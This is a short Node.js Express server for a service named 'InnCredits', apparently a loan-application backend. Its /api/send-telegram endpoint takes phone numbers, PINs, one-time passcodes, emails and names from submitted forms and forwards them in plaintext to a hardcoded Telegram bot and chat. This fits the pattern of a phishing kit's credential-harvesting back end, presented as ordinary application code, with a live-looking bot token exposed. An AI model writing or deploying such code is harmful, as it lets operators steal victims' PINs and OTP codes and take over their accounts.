const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Root route - tells you the backend is running
app.get('/', (req, res) => {
    res.send('InnCredits Backend is running!');
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months`;
        } else {
            message = `🔐 OTP ENTERED 🔐\n\nPhone: ${phone}\nOTP: ${pin}\nEmail: ${email}\nName: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        await fetch(url);
        
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
